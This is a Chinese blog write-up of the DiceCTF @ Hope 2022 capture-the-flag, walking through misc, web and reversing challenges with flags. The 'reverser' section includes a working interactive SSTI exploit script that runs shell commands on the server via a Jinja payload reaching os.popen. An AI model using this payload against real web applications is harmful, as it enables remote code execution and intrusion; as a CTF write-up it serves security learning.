---
title: DiceCTF @ Hope
date: 2022-07-25 12:25:48
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20220723221150162](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207232211222.png?x-oss-process=hzy)

DiceCTF @ Hope

<!--more-->

---------------------

# 前言

这个比赛感觉有亿点点难，比那个LIT CTF难多了，这三天打了这俩比赛，累dei。

# misc

## **discord**

> Please join our Discord server for challenge updates and other important announcements!

hope{a0bffd79ddaa5de3fd8ed2e60a143b08}

## **orphan**

> nothing to see here

下载附件发现是git源码，找HEAD得到分析得到如下add flag

![image-20220723155844887](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231558967.png?x-oss-process=hzy)

add flag的commit id是b53c9e6864ed176ea0192fd8283362a41d94906c，溯源得到flag

![image-20220723160121528](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231601579.png?x-oss-process=hzy)

hope{ba9f11ecc3497d9993b933fdc2bd61e5}

# web

## **secure-page**

> My new website uses cookies for authentication. Now nobody can get in! [secure-page.mc.ax](https://secure-page.mc.ax/)

![image-20220723122949072](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231229716.png?x-oss-process=hzy)

改成true![image-20220723123105053](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231231132.png?x-oss-process=hzy)

hope{signatures_signatures_signatures}

## **reverser**

> An extremely useful tool. Hope there aren't issues with the server-side templating...
>
> The flag is in a file with an unknown name.

考察ssti，但是一直报错

队友的脚本，贴一下

```
import requests
url = "https://reverser.mc.ax/"
while (1):
    cmd = input(">")
    payload = r"""{{[].__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('"""
    payload += cmd
    payload += r"""').read()")}}"""
    print(requests.post(url, data={'text':payload[::-1]}).text)

```

![image-20220723161317272](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231613332.png?x-oss-process=hzy)

hope{cant_misuse_templates}

## **flag-viewer**



![image-20220723162608201](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231626273.png?x-oss-process=hzy)

主要代码如下

```
import os
import random

from server import Server

server = Server()

@server.get('/')
async def root(request):
    return (200, '''
        <title>Flag Viewer</title>
        <link rel="stylesheet" href="/style.css" />
        <div class="container">
            <h1>The Flag Viewer</h1>
            <form action="/flag" method="POST">
                <input
                    type="text"
                    name="user"
                    placeholder="Username"
                    pattern="^(?!admin).*$"
                    oninvalid="this.setCustomValidity('Name not allowed!')"
                    oninput="this.setCustomValidity('')"
                />
                <input type="submit" value="Submit" />
            </form>
            <div>%s</div>
        </div>
    ''' % (
        request.query.get('message', '').replace('<', '&lt;'),
    ))


@server.post('/flag')
async def flag(request):
    data = await request.post()
    user = data.get('user', '')

    if user != 'admin':
        return (302, '/?message=Only the "admin" user can see the flag!')

    return (302, f'/?message={os.environ.get("FLAG", "flag missing!")}')

@server.get('/style.css', c_type='text/css')
async def style(request):
    del request
    return (200, '''
        * {
            font-family: 'Helvetica Neue', sans-serif;
            box-sizing: border-box;
        }

        html, body { margin: 0; }

        .container {
            padding: 2rem;
            width: 90%;
            max-width: 900px;
            margin: auto;
        }

        input:not([type="submit"]) {
            width: 100%;
            padding: 8px;
            margin: 8px 0;
        }
    ''')

server.run('0.0.0.0', 3000)
```

输入admin

![image-20220723162618625](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231626688.png?x-oss-process=hzy)

访问flag

![image-20220723162646451](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231626510.png?x-oss-process=hzy)

post传

![image-20220723162711683](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231627757.png?x-oss-process=hzy)

hope{oops_client_side_validation_again}

## **point**

> what is the point?

![image-20220723165127394](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231651475.png?x-oss-process=hzy)

```
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

type importantStuff struct {
	Whatpoint string `json:"what_point"`
}

func main() {
	flag, err := os.ReadFile("flag.txt")
	if err != nil {
		panic(err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			fmt.Fprint(w, "Hello, world")
			return
		case http.MethodPost:
			body, err := io.ReadAll(r.Body)
			if err != nil {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			if strings.Contains(string(body), "what_point") || strings.Contains(string(body), "\\") {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			var whatpoint importantStuff
			err = json.Unmarshal(body, &whatpoint)
			if err != nil {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			if whatpoint.Whatpoint == "that_point" {
				fmt.Fprintf(w, "Congrats! Here is the flag: %s", flag)
				return
			} else {
				fmt.Fprintf(w, "Something went wrong")
				return
			}
		default:
			fmt.Fprint(w, "Method not allowed")
			return
		}
	})

	log.Fatal(http.ListenAndServe(":8081", nil))

}
```



```
curl -XPOST https://point.mc.ax/ -d '{"WhAt_point":"that_point"}'
```

![image-20220723170427650](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231704722.png?x-oss-process=hzy)

hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}

# rev

## sequence

![image-20220725114720117](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251147205.png?x-oss-process=hzy)

跟进check()

![image-20220725114812108](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251148196.png?x-oss-process=hzy)

跟进read_numbers()

![image-20220725114944848](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251149906.png?x-oss-process=hzy)

输入a1, a1 + 4, a1 + 8, a1 + 12, a1 + 16, a1 + 20，这六个数值，判断是否满足条件，是的话就会返回flag

第一个数值是12，固定的，所以直接一个for循环即可找到六个数字

![image-20220725115800514](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251158581.png?x-oss-process=hzy)

![image-20220725120633670](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251206739.png?x-oss-process=hzy)

hope{definitely_solvable_with_angr}